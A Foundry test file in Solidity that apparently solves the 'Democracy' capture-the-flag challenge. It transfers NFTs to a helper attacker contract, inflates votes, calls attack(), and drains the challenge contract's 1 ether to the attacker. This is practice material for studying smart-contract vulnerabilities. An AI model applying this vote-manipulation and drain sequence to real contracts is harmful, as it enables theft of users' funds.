// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {DeployDemocracyScript} from "@script/7_DeployDemocracy.s.sol";
import {Democracy} from "@main/Democracy.sol";
import {DemocracyAttacker} from "@main/DemocracyAttacker.sol";

// import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";


interface IDemocracy {
    function votes(address voter) external returns (uint256);
}


contract DemocracyTest is Test, DeployDemocracyScript {

    string  mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    address deployer = vm.addr(deployerPrivateKey);

    // address public attacker = address(12);
    address public attacker = msg.sender;

    DemocracyAttacker democracyAttacker;

    function setUp() public {
        vm.startPrank(deployer);

        vm.deal(deployer, 1 ether);
        //  vm.deal(attacker, 1 ether);

        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");

        democracyChallenge = new Democracy{value: 1 ether}();
        // DeployDemocracyScript.run();
        vm.stopPrank(  );
    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        democracyChallenge.nominateChallenger(attacker);

        assertEq( address(democracyChallenge).balance, 1 ether );
        assertEq( IDemocracy(address(democracyChallenge)).votes(deployer), 5 );
        assertEq( IDemocracy(address(democracyChallenge)).votes(attacker), 3 );
        assertEq( democracyChallenge.balanceOf(attacker), 2 );
        
        democracyAttacker = new DemocracyAttacker(address(democracyChallenge));
        democracyChallenge.approve(attacker, 0);
        democracyChallenge.transferFrom(attacker, address(democracyAttacker), 0 );
        democracyChallenge.vote(attacker);
        democracyChallenge.approve(attacker, 1);
        democracyChallenge.transferFrom(attacker, address(democracyAttacker), 1 );
        democracyAttacker.attack();
        democracyChallenge.withdrawToAddress(attacker);

        assertEq( address(democracyChallenge).balance, 0 ether );

        vm.stopPrank(  );
    }

}